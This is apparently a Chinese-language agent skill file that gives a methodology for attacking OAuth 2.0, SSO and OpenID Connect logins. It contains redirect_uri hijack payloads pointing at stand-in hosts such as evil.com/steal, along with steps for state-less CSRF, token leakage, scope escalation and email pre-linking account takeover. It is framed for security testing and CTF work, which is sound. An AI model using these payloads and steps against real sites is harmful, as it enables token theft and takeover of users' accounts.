---
name: oauth-sso-attack
description: "OAuth 2.0 / SSO / OpenID Connect 认证流程攻击。当目标有「使用 Google/GitHub/微信 登录」按钮、redirect_uri 参数、authorization_code 流程、或 /.well-known/openid-configuration 端点时使用。覆盖 redirect_uri 劫持、state 缺失 CSRF、token 泄露、scope 提升"
metadata:
  tags: "oauth,sso,openid,oidc,redirect_uri,authorization,token,login,认证,第三方登录,cas,saml"
  category: "exploit"
---

# OAuth/SSO 攻击方法论

OAuth 2.0 是现代 Web 应用最常见的第三方认证协议。攻击面集中在认证流程的各个跳转环节——redirect_uri 校验、state 参数、token 传递。

## ⛔ 深入参考（必读）

- redirect_uri 完整 payload、Token 泄露途径、账户接管流程 → [references/oauth-attack-vectors.md](references/oauth-attack-vectors.md)

## Phase 1: 识别 OAuth 流程

点击「第三方登录」，观察重定向 URL 中的 `client_id`, `redirect_uri`, `response_type`, `scope`, `state`。

检查端点：`/.well-known/openid-configuration`, `/oauth/authorize`, `/api/auth/providers`

## Phase 2: redirect_uri 劫持（最常见）

目标：让 code/token 发到攻击者 URL。快速测试：
```
redirect_uri=https://target.com/callback/../evil
redirect_uri=https://evil.target.com/callback
redirect_uri=https://target.com/callback?next=https://evil.com
redirect_uri=https://evil.com/steal
```
→ 完整 payload 列表 → [references/oauth-attack-vectors.md](references/oauth-attack-vectors.md)

## Phase 3: state 缺失 → CSRF 攻击

无 `state` 参数时：攻击者获取 code → 构造 callback 链接 → 诱导受害者点击 → 账户绑定攻击者第三方账户

## Phase 4: Token 泄露

- **Referer 泄露**：回调页含外部资源 → token 通过 Referer 头外泄
- **Implicit Flow**：`response_type=token` → access_token 在 URL fragment
- **日志**：code 在 URL query，可能被记录

## Phase 5: 其他攻击面

- Scope 提升：`scope=openid profile email admin`
- client_secret 泄露：检查 JS 源码/GitHub/配置文件
- 账户接管：邮箱匹配合并 → [references/oauth-attack-vectors.md](references/oauth-attack-vectors.md)

## Phase 6: CTF 与账户接管

### 6.1 CTF 中的 OAuth
- 重点考察 redirect_uri 绕过，Flag 在管理员 token 或高权限 scope API 中

### 6.2 账户接管 — 邮箱预关联攻击
1. 攻击者注册 `attacker@target.com`（后缀匹配利用）
2. 在第三方平台修改邮箱为受害者邮箱
3. 受害者 OAuth 登录时自动关联到已有账户（邮箱匹配）
4. 关键：检查目标是否验证邮箱（绕过邮箱验证）
